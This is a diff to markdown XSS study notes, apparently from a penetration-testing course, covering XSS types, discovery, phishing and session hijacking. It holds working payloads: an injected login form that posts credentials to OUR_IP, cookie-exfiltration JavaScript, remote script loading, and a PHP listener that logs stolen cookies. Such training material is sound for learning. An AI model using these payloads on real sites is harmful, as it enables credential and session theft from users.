@@ -14,7 +14,7 @@ The first and most critical type of XSS vulnerability is Stored XSS or Persisten
 
 This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.
 
-- **<script>alert(window.origin)</script>**
+```<script>alert(window.origin)</script>```
 
 As some modern browsers may block the alert() JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads to verify the existence of XSS. One such XSS payload is <plaintext>, which will stop rendering the HTML code that comes after it and display it as plaintext. Another easy-to-spot payload is <script>print()</script> that will pop up the browser print dialog, which is unlikely to be blocked by any browsers.
 
@@ -32,9 +32,9 @@ The third and final type of XSS is another Non-Persistent type called DOM-based 
 To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the Source and Sink of the object displayed on the page. The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field.
 
 On the other hand, the Sink is the function that writes the user input to a DOM Object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JavaScript functions to write to DOM objects are:
-- document.write();
-- DOM.innerHTML;
-- DOM.outerHTML.
+```document.write();```
+```DOM.innerHTML;```
+```DOM.outerHTML.```
 
 Furthermore, some of the jQuery library functions that write to DOM objects are:
 - add();
@@ -43,7 +43,7 @@ Furthermore, some of the jQuery library functions that write to DOM objects are:
 
 If we try the XSS payload we have been using previously, we will see that it will not execute. This is because the innerHTML function does not allow the use of the <script> tags within it as a security feature. Still, there are many other XSS payloads we use that do not contain <script> tags, like the following XSS payload:
 
-- **<img src="" onerror=alert(window.origin)>**
+```<img src="" onerror=alert(window.origin)>```
 
 # XSS discovery
 
@@ -51,7 +51,7 @@ Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or ZAP
 
 We can use XSS Strike which is an open source tool for discovering XSS vulnerabilities.
 
-- **python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"**
+```python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"```
 
 ## Manual discovery
 The most basic method of looking for XSS vulnerabilities is manually testing various XSS payloads against an input field in a given web page.
@@ -77,7 +77,7 @@ Another very common type of XSS attack is a phishing attack. Phishing attacks us
 
 Example of JS malicious code:
 
-- **document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');**
+```document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');```
 
 We need to set a listener to steal credentials (example in php code):
 
@@ -94,10 +94,12 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 ```
 
 We can start this index.php with something like that:
-- mkdir /tmp/tmpserver;
-- cd /tmp/tmpserver;
-- Put our index.php inside this directory;
-- sudo php -S 0.0.0.0:80.
+```
+mkdir /tmp/tmpserver
+cd /tmp/tmpserver
+Put our index.php inside this directory
+sudo php -S 0.0.0.0:80
+```
 
 # Session hijacking
 
@@ -133,11 +135,11 @@ However, this introduces two issues:
 
 In HTML, we can write JavaScript code within the <script> tags, but we can also include a remote script by providing its URL, as follows:
 
-- **<script src="http://OUR_IP/script.js"></script>**
+```<script src="http://OUR_IP/script.js"></script>```
 
 So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:
 
-- **<script src="http://OUR_IP/username"></script>**
+```<script src="http://OUR_IP/username"></script>```
 
 If we get a request for /username, then we know that the username field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request.
 
@@ -145,22 +147,21 @@ If we get a request for /username, then we know that the username field is vulne
 Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.
 It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.
 There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by PayloadsAllTheThings:
-- **document.location='http://OUR_IP/index.php?c='+document.cookie;**
-- **new Image().src='http://OUR_IP/index.php?c='+document.cookie;**
+```document.location='http://OUR_IP/index.php?c='+document.cookie;```
+```new Image().src='http://OUR_IP/index.php?c='+document.cookie;```
 
 
 We can write any of these JavaScript payloads to script.js, which will be hosted on our VM as well:
-- **new Image().src='http://OUR_IP/index.php?c='+document.cookie**
+```new Image().src='http://OUR_IP/index.php?c='+document.cookie```
 
 Now, we can change the URL in the XSS payload we found earlier to use script.js:
-- **<script src=http://OUR_IP/script.js></script>**
+```<script src=http://OUR_IP/script.js></script>```
 
 With our PHP server running, we can now use the code as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. However, if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.
 
 Example of index.php to steal cookies:
 
 ```
-
 <?php
 if (isset($_GET['c'])) {
     $list = explode(";", $_GET['c']);
